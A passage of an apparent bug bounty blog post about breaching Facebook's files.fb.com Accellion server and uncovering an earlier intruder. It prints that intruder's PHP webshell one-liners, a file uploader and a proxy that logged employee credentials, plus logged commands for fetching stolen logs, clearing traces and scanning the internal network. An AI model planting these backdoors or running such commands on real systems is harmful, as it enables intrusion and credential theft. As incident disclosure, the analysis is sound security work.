&lt;p&gt;From a pentester‚Äôs view, I tend to start from recon and do some research. First, I‚Äôll determine how large is the ‚Äúterritory‚Äù of the company on the internet, then‚Ä¶try to find a nice entrance to get in, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
  &lt;li&gt;‚Ä¶etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;

&lt;p&gt;Here I‚Äôd like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;For most enterprises, ‚Äú&lt;strong&gt;Network Boundary&lt;/strong&gt;‚Äù is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it‚Äôs impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That‚Äôs why luck is often on the attacker‚Äôs side: a vulnerable server on the ‚Äúborder‚Äù is enough to grant a ticket to the internal network!&lt;/li&gt;
  &lt;li&gt;Lack of awareness in ‚Äú&lt;strong&gt;Networking Equipment&lt;/strong&gt;‚Äù protection. Most networking equipment doesn‚Äôt offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
  &lt;li&gt;Security of people: now we have witnessed the emergence of the ‚Äú&lt;strong&gt;Breached Database&lt;/strong&gt;‚Äù (aka ‚Äú&lt;strong&gt;Social Engineering Database&lt;/strong&gt;‚Äù in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access‚Ä¶then voil√†! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man‚Äôs password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW seemed to stand for ‚Äú&lt;strong&gt;TheFacebook Network&lt;/strong&gt;‚Äù&lt;br /&gt;
Then I found bellow server through public data&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;WOW. When I accessed vpn.tfbnw.net there‚Äôs the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited‚Ä¶nevertheless, it brought up the beginning of the following story.&lt;/p&gt;

&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Let‚Äôs try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;

&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
&lt;em&gt;‚Üë Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Judging from the LOGO and Footer, this seems to be Accellion‚Äôs Secure File Transfer (hereafter known as FTA)&lt;/p&gt;

&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;

&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7‚Äôs Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from ‚Äú&lt;strong&gt;/tws/getStatus&lt;/strong&gt;‚Äù. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;

&lt;p&gt;Actually, from black-box testing, I didn‚Äôt find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;

&lt;p&gt;The FTA Product&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it‚Äôs gonna be messy‚Ä¶&lt;/p&gt;

&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T&lt;br /&gt;
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;

&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;‚Üë Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;

&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
  &lt;li&gt;Remote Syslog server&lt;/li&gt;
  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;

&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;

&lt;p&gt;First of all I found some strange PHP error messages in ‚Äú&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;‚Äù&lt;br /&gt;
These error messages seemed to be caused by modifying codes online?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;‚Üë PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous ‚Äúvisitors‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;‚Üë Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first few ones were typical PHP one-line backdoor and there‚Äôs one exception: ‚Äú&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;‚Äù&lt;/p&gt;

&lt;p&gt;In include_once ‚Äú&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;‚Äù was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;

&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;‚Üë Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that‚Äôs kinda cheap‚Ä¶XD)&lt;/p&gt;

&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly ‚Äú&lt;strong&gt;@fb.com&lt;/strong&gt;‚Äù and ‚Äú&lt;strong&gt;@facebook.com&lt;/strong&gt;‚Äù. Upon seeing it I thought it‚Äôs a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;GUESS&lt;/strong&gt; they can access to services such as Mail OWA, VPN for advanced penetration‚Ä¶&lt;/p&gt;

&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
  &lt;li&gt;When the hacker was sending out commands, he didn‚Äôt take care of STDERR, and left a lot of command error messages in web log which the hacker‚Äôs operations could be seen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Packing files&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD
&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to access internal server &lt;br /&gt;
(Looked like Mail OWA could be accessed directly‚Ä¶)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;

